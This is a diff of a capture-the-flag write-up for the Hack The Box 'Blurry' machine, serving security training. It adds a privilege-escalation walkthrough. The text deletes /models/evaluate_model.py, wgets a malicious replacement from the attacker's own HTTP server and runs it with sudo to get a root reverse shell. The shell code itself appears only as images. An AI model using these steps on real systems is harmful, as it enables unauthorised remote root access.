@@ -90,7 +90,6 @@ Then execute the python payload
 
 ```bash
 python3 <your python file payload>.py
-}
 ```
 
 NOTE: At least in my case, it took a while for me to establish a connection. I recommend getting a cup of coffee and coming back. After, you should see that we that we have a reverse shell.
@@ -111,7 +110,51 @@ Before we do that, we can explore the directory to find the user flag. You shoul
 
 After we get the userflag, our next target is the root flag. Since we know that the user we are logged in as (jippity) has sudo privlages specified in the file path above, we can navigate to the /models directory and see what is in there.
 
-As we will see, they have two files, one being a demo_model.pth and a evaluate_model.py. 
+As we will see, they have two files, one being a demo_model.pth and a evaluate_model.py. Since we know that we can run sudo privlages, we can create a malicious python script to execute in order to excalate our privlages. We will do this by popping a reverse shell. Below is the python script I created in order to do so.
+
+![evaluate_model python reverseshell](https://github.com/theryeguy92/HTB_Blurry_Writeup/assets/103153678/736ec370-0133-4e3e-85f4-0fa073cd456a)
+
+
+I named this file evaluate_model.py. The reason why is because we are tricking the system into thinking that it is running the origional evaluate_model.py that is within the /models directory. However, it will be running the code above instead.
+
+After we created our second payload, we will remove the origional evaluate_model.py
+```bash
+rm /models/evaluate_model.py
+```
+
+Once that is removed, we will set up a simple python server on our attacking machine to upload the malicious python file.
+
+```bash
+python -m http.server <port of your choosing>
+```
+
+Then we will use wget to upload the file within the victim machine in the /models directory. NOTE: In your attacking machine, you will need to be in the directory where you ahve your malicious python file is.
+
+```bash
+wget http://<your ip>:<your port>/<malicious.py> -O evaluate_model.py
+```
+
+After, we should see that the script was succesfully uploaded. Now we will set up a netcat listener
+
+![reverse shell root](https://github.com/theryeguy92/HTB_Blurry_Writeup/assets/103153678/3ce4a8bf-1a75-4f22-995e-22613e9743ba)
+
+
+
+Now we will execute the scriptwithin the models directory with the following command.
+
+```bash
+sudo /usr/bin/evaluate_model /models*.pth
+```
+![sudo command](https://github.com/theryeguy92/HTB_Blurry_Writeup/assets/103153678/2d580148-49a5-4d90-bf4f-81d8fdfb8355)
+
+At last we are logged in as root.
+
+![root reverse shell](https://github.com/theryeguy92/HTB_Blurry_Writeup/assets/103153678/ceb961b6-bf77-400c-b644-eec87db80749)
+
+From here, we can explore directories as root and we can cat the root.txt file to get the root flag.
+
+![rooted](https://github.com/theryeguy92/HTB_Blurry_Writeup/assets/103153678/7f4a980e-eb49-4cce-9106-518bd9062457)
+
 
 
 
